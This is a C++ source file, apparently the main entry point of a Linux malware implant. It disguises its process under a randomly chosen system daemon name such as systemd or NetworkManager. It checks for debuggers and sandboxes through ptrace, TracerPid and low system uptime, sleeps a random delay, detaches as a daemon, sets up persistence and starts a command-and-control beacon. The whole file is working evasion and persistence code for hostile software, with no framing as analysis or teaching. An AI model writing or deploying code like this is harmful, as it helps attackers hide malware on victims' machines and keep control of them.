#include "beacon/Beacon.h"
#include "persistence/Persistence.h"
#include "evasion/Detection.h"
#include "utils/Logger.h"
#include "utils/Obfuscator.h"
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <signal.h>
#include <vector>
#include <string>
#include <cstring>
#include <random>
#include <chrono>
#include <thread>

namespace {
    std::string fake_names[] = {
        "systemd", "dbus-daemon", "pulseaudio", "upowerd",
        "gvfsd", "bluetoothd", "NetworkManager", "polkitd", "rtkit-daemon"
    };

    void ScrubArgv(int argc, char** argv, const char* newName) {
        size_t len = 0;
        for (int i = 0; i < argc; i++) len += strlen(argv[i]) + 1;
        memset(argv[0], 0, len);
        strncpy(argv[0], newName, len - 1);
        prctl(PR_SET_NAME, newName, 0, 0, 0);
    }

    void AntiAnalysis() {
        if (getenv("CI")) return;
        if (ptrace(PTRACE_TRACEME, 0, nullptr, nullptr) == -1) _exit(0);

        FILE* f = fopen(OBF("/proc/self/status").c_str(), "r");
        if (f) {
            char line[256];
            while (fgets(line, sizeof(line), f)) {
                if (strstr(line, OBF("TracerPid:").c_str()) && !strstr(line, "\t0")) {
                    fclose(f);
                    _exit(0);
                }
            }
            fclose(f);
        }

        double uptime = 0;
        f = fopen(OBF("/proc/uptime").c_str(), "r");
        if (f) {
            if (fscanf(f, "%lf", &uptime) == 1 && uptime < 120.0) {
                fclose(f);
                _exit(0);
            }
            fclose(f);
        }
    }

    void Daemonize() {
        if (getenv("CI")) return;

        pid_t pid = fork();
        if (pid < 0) exit(EXIT_FAILURE);
        if (pid > 0) exit(EXIT_SUCCESS);

        if (setsid() < 0) exit(EXIT_FAILURE);

        signal(SIGCHLD, SIG_IGN);
        signal(SIGHUP, SIG_IGN);

        pid = fork();
        if (pid < 0) exit(EXIT_FAILURE);
        if (pid > 0) exit(EXIT_SUCCESS);

        umask(0);
        chdir("/");
        for (int x = sysconf(_SC_OPEN_MAX); x >= 0; x--) close(x);
    }
}

int main(int argc, char** argv) {
    std::mt19937 rng((unsigned int)std::chrono::system_clock::now().time_since_epoch().count());
    std::uniform_int_distribution<size_t> dist(0, 8);
    const char* chosen = fake_names[dist(rng)].c_str();

    if (!getenv("CI")) {
        ScrubArgv(argc, argv, chosen);
    }

    AntiAnalysis();

    int jitter = evasion::Detection::GetJitterDelay();
    if (jitter > 0 && !getenv("CI")) {
        for (int i = 0; i < jitter; i++) usleep(1000000);
    }

    Daemonize();

    LOG_INFO("Implant starting...");

    persistence::establishPersistence();

    beacon::Beacon implant;
    implant.run();

    return 0;
}
